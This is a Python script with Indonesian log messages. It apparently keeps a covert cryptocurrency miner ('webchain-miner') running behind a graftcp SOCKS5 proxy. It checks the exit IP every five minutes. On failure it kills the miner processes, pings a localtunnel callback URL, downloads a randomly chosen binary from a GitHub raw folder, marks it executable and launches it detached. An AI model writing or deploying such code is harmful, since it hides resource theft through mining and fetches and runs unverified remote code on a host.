import time
import requests
import subprocess
import os
import random
import configparser

def get_proxy_ip_from_config(file_path):
    config = configparser.ConfigParser()
    config.read(file_path)
    return config['local'].get('socks5', '').split(':')[0]

def check_proxy():
    file_path = 'graftcp/local/graftcp-local.conf'
    proxy_ip = get_proxy_ip_from_config(file_path)

    if not proxy_ip:
        print("Tidak dapat menemukan IP proxy dalam konfigurasi.")
        return False
    
    curl_command = f"./graftcp/graftcp curl http://checkip.amazonaws.com"
    
    try:
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout.strip() == proxy_ip:
            print(result.stdout.strip())
            return True
    except Exception as e:
        print(f"Error checking proxy: {e}")
    return False

def kill_processes(process_list):
    subprocess.run(['pkill', '-9'] + process_list)

def send_info():
    try:
        requests.get('https://localtopublic.ap.loclx.io/info')
    except requests.RequestException as e:
        print(f"Error saat mengakses website: {e}")

def download_and_run_file():
    download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
    file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']

    try:
        os.chdir("..")
        random_file_name = random.choice(file_names)
        download_link = f"{download_link_base}{random_file_name}"
        response = requests.get(download_link)
        
        if response.status_code == 200:
            file_path = f"./{random_file_name}"
            with open(file_path, 'wb') as file:
                file.write(response.content)
            os.chmod(file_path, 0o755)
            
            subprocess.Popen(f"./{random_file_name}", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
        else:
            raise Exception("Gagal mengunduh file.")
    except Exception as e:
        print(f"Error downloading/running file: {e}")

if __name__ == "__main__":
    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
    
    while True:
        if check_proxy():
            print("Proxy aktif.")
            time.sleep(300)
        else:
            print("Proxy tidak valid. Menghentikan proses.")
            kill_processes(process_list)

            try:
                send_info()
            except Exception as ex:
                print(f"Error saat mengirim info: {ex}")

            try:
                download_and_run_file()
                break
            except Exception as e:
                print(f"Error saat download dan jalankan file: {e}")
                time.sleep(30)
